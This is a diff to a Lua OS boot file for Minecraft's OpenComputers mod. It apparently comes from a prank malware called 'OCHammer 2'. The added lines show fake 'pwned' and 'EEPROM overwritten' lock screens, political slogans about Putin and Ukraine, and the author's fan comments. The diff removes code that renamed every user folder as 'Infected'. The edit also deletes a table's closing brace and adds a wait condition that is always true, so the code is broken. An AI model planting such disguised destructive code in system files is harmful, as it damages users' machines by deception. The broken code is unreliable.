@@ -184,6 +184,9 @@ local APRIL = {
     "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
     " ";
     "Press any key to continue...";
+    " ";
+    "FOR RUSSIANS: THE MEDIA IS TELLING LIES DO NOT TRUST THEM THEY ATTACKED UKRAINE";
+    "PUTIN IS GOING TO REGRET EVERYTHING HE DID";
 }
 
 -- loop over each item in a table and display it on the screen
@@ -201,6 +204,41 @@ gp.fill(1,1,resX,resY," ")
 -- display some greetz and stuff
 displayTable(APRIL)
 
+gp.setBackground(0x000000)
+gp.setForeground(0xFFFFFF)
+
+gp.fill(1,1,resX,resY," ")
+
+local Latvija_Notice = {
+  "OCHammer 2 has detected that you are in Latvia";
+  "by testing Russian websites to see if they are blocked";
+  "It appears, that they are blocked.";
+  " ";	
+  "SPECIAL OFFER: ";
+  " ";
+  "Bypass Fortinet (not really) (view source code on gh)"; -- sike you tought it was hypixel mvp++
+  " ";
+  "Anyways, LABRĪT!!!";
+  " ";
+  "Your OpenComputer got pwned by OCHammer 2";
+  "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
+  "This is the last time you will use it.";
+  " ";
+  "Rules:";
+  " ";
+  "1. No unplugging your EEPROM (or any component at all)";
+  "2. No shutdown or reboot";
+  "3. No changing the EEPROM's code";
+  "4. No replacing OS.lua";
+  " ";
+  "If you break these rules, your OpenComputer will be broken forever.";
+  "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
+  " ";
+  "Press any key to make the Latvian Goverment delete Fortinet...";
+  " ";
+  "By the way, Putin is a bad person! DO NOT ATTACK UKRAINE!";
+}
+
 local lastPull = {}
 
 local veryfunny = {
@@ -208,18 +246,12 @@ local veryfunny = {
   "capyy/";
   "cappy"; -- alias for capyy
   "cappy/";
-}
-  
-local bootfs = component.proxy(ef.getData())
-
-for _,v2 in pairs(component.invoke(bootfs.address,"list","/Users/")) do
-  component.invoke(bootfs.address,"rename","/Users/" .. tostring(v2), "Infected by OCHammer 2 " .. tostring(v2))
-end
-  
 
 repeat
   lastPull = {computer.pullSignal(1)}
 until lastPull[1] == "key_up" or "component_added" or "component_removed"
+
+-- Technoblade never dies
 
 ---------------------------------------- System initialization ----------------------------------------
 
@@ -342,7 +374,30 @@ local function UIRequire(module)
   return require(module)
 end
 
--- Preparing screen for loading libraries
+-- Because you looked at the source code too much, here's something:
+
+-- I (OCboy3) developed OCHammer 2 with the help of Github copilot
+-- OCHammer is less cruel than OCHammer 2, because of the files they destroy
+
+-- Technoblade never dies
+
+-- My favourite youtubers (by category):
+-- Category, Youtuber
+-- Hypixel: Technoblade
+-- Roblox: Elitelupus
+-- Lifesteal SMP: Branzy
+-- Technology: Linus Tech Tips, NetworkChuck
+
+-- You know that Clown has a casino.
+-- Tubbo gambled his hearts but someone saved him.
+
+-- By the way, check out my Instagram: instagram.com/ocboy3
+
+-- Rest in peace, Techno.
+
+-- Also, can someone please help me make a Google Assistant, but it has Technoblade's voice. (probably a future project)
+
+-- Preparing screen for loading libraries because yes
 GPUProxy.setBackground(0xE1E1E1)
 GPUProxy.fill(1, 1, screenWidth, screenHeight, " ")
 
